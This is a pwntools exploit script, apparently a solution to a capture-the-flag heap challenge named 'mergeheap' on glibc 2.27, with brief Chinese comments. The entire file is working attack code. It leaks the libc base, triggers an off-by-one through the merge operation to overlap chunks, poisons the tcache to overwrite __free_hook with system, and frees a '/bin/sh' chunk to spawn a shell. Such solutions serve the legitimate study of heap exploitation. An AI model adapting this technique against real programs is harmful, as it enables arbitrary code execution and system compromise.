#合并造成offbyone
from pwn import *
context.log_level = 'debug'

elf = ELF("./mergeheap")
p = elf.process()
libc = ELF("./libc-2.27.so")
#p = remote("")
def dbg():
	gdb.attach(p)
	p.interactive()

def add(size, content):
	p.sendlineafter(">>", '1')
	p.sendlineafter("len:", str(size))
	p.sendlineafter("content:", content)

def show(idx):
	p.sendlineafter(">>", '2')
	p.sendlineafter("idx:", str(idx))

def free(idx):
	p.sendlineafter(">>", '3')
	p.sendlineafter("idx:", str(idx))

def merge(idx1, idx2):
    	p.sendlineafter(">>", "4")
   	p.sendlineafter("idx1:", str(idx1))
    	p.sendlineafter("idx2:", str(idx2))
    
def exp():	
	for _ in range(9):
		add(0x80, 'a')	
	for i in range(8):	
		free(i)
		
	add(0x8, 'a'*8)#0		
	show(0)	
	libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2) - 0x3ebd20
	log.success("libc_base == >" + hex(libc_base))
	free_hook = libc_base + libc.sym['__free_hook']
	system = libc_base + libc.sym['system']	
	add(0x60, 'a')#1		
	add(0xb8, 'a')#2
	add(0x58, 'a'*0x58)#3
	add(0x60, 'b'*0x5f+'\xa1')#4
	add(0x50, '/bin/sh\x00')#5
	free(2)	
	merge(3, 4)		#合并造成off by one，使得chunk3 size位变为0xa1
	free(4)					
	free(3)
	add(0x90, 'a'*0x58+p64(0x71)+p64(free_hook))	#再次申请chunk3造成chunk overlap，进而修改tcache bin的fd位为free_hook
	add(0x60, 'a')	
	add(0x60, p64(system))	
	free(5)
	p.interactive()
if __name__ == '__main__':
	exp()
